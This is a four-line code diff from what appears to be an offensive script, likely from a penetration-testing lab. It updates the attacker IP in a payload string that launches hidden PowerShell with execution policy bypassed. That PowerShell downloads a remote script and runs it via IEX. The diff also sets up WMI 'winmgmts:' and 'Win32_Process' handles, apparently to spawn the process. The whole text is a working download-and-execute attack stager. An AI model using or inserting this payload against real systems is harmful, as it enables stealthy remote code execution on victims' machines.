@@ -1,4 +1,4 @@
-$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
+$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.71/run.txt'))"
 $payload1 = "winmgmts:"
 $payload2 = "Win32_Process"
 
